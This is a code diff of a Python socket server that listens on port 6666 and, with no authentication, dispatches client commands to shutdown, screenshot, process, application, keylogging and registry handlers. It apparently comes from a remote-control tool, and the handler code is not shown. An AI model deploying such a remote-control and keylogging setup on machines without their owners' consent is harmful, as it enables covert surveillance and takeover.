@@ -1,8 +1,14 @@
 
 import socket
+
+from handler_state import HandlerState
+
 from shutdown_handler import ShutdownHandler
 from process_handler import ProcessHandler
-from handler_state import HandlerState
+from application_handler import ApplicationHandler
+from screenshot_handler import ScreenshotHandler
+from keystroke_handler import KeystrokeHandler
+from registry_handler import RegistryHandler
 
 HEADER = 64
 FORMAT = "utf-8"
@@ -11,11 +17,17 @@ HOST = "0.0.0.0"
 PORT = 6666
 BACKLOG = 10
 
+TEMP_PATH = "temp.txt"
+
 class ServerProgram:
+    QUIT_PROGRAM = 0
+    CONTINUE_PROGRAM = 1
+
     def __init__(self, host, port, backlog):
         self.serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.serverSocket.bind((host, port))
         self.serverSocket.listen(backlog)
+
         self.currHandler = None
 
         # Only accepts one client
@@ -33,15 +45,17 @@ class ServerProgram:
             if not req:
                 print("No messages sent")
                 break
-            self.HandleRequest(req)
+            state = self.HandleRequest(req)
+            if state == ServerProgram.QUIT_PROGRAM:
+                break
 
 
     def ReceiveMessage(self):
         message_length = self.clientSocket.recv(HEADER).decode(FORMAT)
         if message_length:
             length = int(message_length)
-            message = self.clientSocket.recv(length).decode(FORMAT)
-            return message
+            rawmessage = self.clientSocket.recv(length)
+            return rawmessage.decode(FORMAT)
         return None
 
     def SendMessage(self, string):
@@ -52,32 +66,73 @@ class ServerProgram:
         bytes_sent = self.clientSocket.send(length)
         self.clientSocket.send(req)
 
-    def HandleRequest(self, request):
-        state = None
-        # if not self.currHandler:
-        #     if request == 'SHUTDOWN':
-        #         self.currHandler = ShutdownHandler()
-        #         state = self.currHandler.Handle()
-        #     elif request == 'PROCESS':
-        #         self.currHandler = ProcessHandler()
-        #     elif request == 'APPLICATION':
-        #         self.currHandler = ApplicationHandler()
-        #     elif request == 'SCREENSHOT':
-        #         self.currHandler = ScreenshotHandler()
-        #     elif request == 'REGISTRY':
-        #         self.currHandler = RegistryHandler()
-        #     elif request == 'KEYSTROKE':
-        #         self.currHandler = KeyStrokeHandler()
-        #     elif request == 'EXIT':
-        #         self.currHandler = ExitHandler()
+    def HandleRequest(self, requestString):
+        immediate = False
+        request, data = self.SplitRequest(requestString)
 
-        print(request)
+        state = None
+        extraInfo = None
+        # FINISH request exits the current handler
+        # EXIT request finishes the program
+        if request == "FINISH":
+            self.currHandler = None
+            self.SendMessage("SUCCEEDED")
+            return ServerProgram.CONTINUE_PROGRAM  
+        elif request == "EXIT":
+            self.currHandler = None
+            self.SendMessage("SUCCEEDED")
+            return ServerProgram.QUIT_PROGRAM 
+        # If no handler is currently active
+        elif not self.currHandler:
+            # SHUTDOWN and SCREENSHOT are immeditate handlers
+            immediate = True
+            if request == "SHUTDOWN":
+                self.currHandler = ShutdownHandler()
+            elif request == "SCREENSHOT":
+                self.currHandler = ScreenshotHandler()
+
+            # The rest needs additional requests and looping
+            else:
+                immediate = False
+                state = HandlerState.SUCCEEDED
+                if request == "PROCESS":
+                    self.currHandler = ProcessHandler()
+                elif request == "APPLICATION":
+                    self.currHandler = ApplicationHandler()
+                elif request == "KEYLOG":
+                    self.currHandler = KeystrokeHandler(TEMP_PATH)
+                elif request == "REGISTRY":
+                    self.currHandler = RegistryHandler()
+
+        # Else let current handler handle request
+        else:
+            state, extraInfo = self.currHandler.Execute(request, data)
+
+        if self.currHandler and immediate:
+            state, extraInfo = self.currHandler.Execute("", "")
+            self.currHandler = None
+            immediate = False
+
+        print(request, data, extraInfo)
+
         if state == HandlerState.SUCCEEDED:
-            self.SendMessage("DONE")
+            self.SendMessage("SUCCEEDED")
         elif state == HandlerState.FAILED:
             self.SendMessage("FAILED")
+        else:
+            self.SendMessage("INVALID")
 
-        
+        return ServerProgram.CONTINUE_PROGRAM
+
+
+    def SplitRequest(self, request):
+        a = request.split(" ", 1)
+        if len(a) == 2:
+            return a[0], a[1]
+        elif len(a) == 1:
+            return a[0], None
+        else:
+            raise ValueError("Empty request")
 
 
 
